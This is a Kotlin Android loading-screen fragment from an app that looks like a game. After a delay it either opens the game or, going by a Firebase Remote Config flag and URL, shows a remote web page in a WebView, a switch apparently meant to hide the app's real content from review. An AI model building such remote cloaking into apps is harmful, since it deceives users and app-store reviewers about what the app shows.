package com.apps.tz.rainbowgoldstation.black

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.apps.tz.rainbowgoldstation.R
import com.apps.tz.rainbowgoldstation.databinding.LoudingFragmentBinding
import com.apps.tz.rainbowgoldstation.shared.SharedPrefs
import com.google.firebase.remoteconfig.FirebaseRemoteConfig


var mainUrl = ""

class LoudingFragment : Fragment() {


    val binding by lazy { LoudingFragmentBinding.inflate(layoutInflater) }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        Handler(Looper.getMainLooper()).postDelayed({
        val status = SharedPrefs(requireContext()).getStatus()
        val url = SharedPrefs(requireContext()).getUrl()


        if (status == SharedPrefs.STATUS_OPEN_GAME) {
            Log.d("LoudingFragment", "SharedPrefs: open game because status $status")
            toGame()
        } else if (status == SharedPrefs.STATUS_OPEN_URL && !url.isNullOrBlank()) {
            Log.d("LoudingFragment", "SharedPrefs: open url $url")
            mainUrl = url
            toWebview()
        } else if(status == SharedPrefs.STATUS_OPEN_SCREEN_THREE){
            findNavController().navigate(R.id.action_LoudingFragment_to_gameThreeFragment)
            Log.d("LoudingFragment", "open screen three")
        } else {

            val ramdomComputer = listOf("J235","L901","N988","F509","M091","V289","Q971","X198","T601","W176","E612","H499",)
            SharedPrefs(requireContext()).setComputer(ramdomComputer.random())

            val listPassword = listOf("JK8LPP","JJH34","JGK0","LOP43","JPO12","LZA345","VBF209"
                ,"EHDH23","3HD789","47HDI","YCHH45","DOPB59","D803J","FJK567","WHUE01","AKS01")
            SharedPrefs(requireContext()).setCode(listPassword.random())
            Log.d("LoudingFragment", "SharedPrefs: getLoudingLogic because status $status")
            getLoudingLogic()
        }

    },6000L)
        return binding.root
    }
    
    private fun toGame() {
        findNavController().navigate(R.id.action_LoudingFragment_to_gameFragment)
    }
    
    private fun toWebview() {
        findNavController().navigate(R.id.action_louding_webview)
    }

    private fun getLoudingLogic() {

        val fireBaseLinc = FirebaseRemoteConfig.getInstance()
        fireBaseLinc.fetchAndActivate()
            .addOnCompleteListener { reqest ->
                if (reqest.isSuccessful) {
                    val getFBurl = FirebaseRemoteConfig.getInstance().getString("url")
                    val getFBstate = FirebaseRemoteConfig.getInstance().getBoolean("state")

                    Log.d("fireBase", getFBurl)
                    if (getFBurl.isNotBlank() && getFBstate) {
                        try {
                            mainUrl = getFBurl
                            toWebview()

                        } catch (e: Exception) {
                            toGame()
                        }
                    } else {
                        toGame()
                    }
                } else {
                    toGame()
                }
            }
    }

}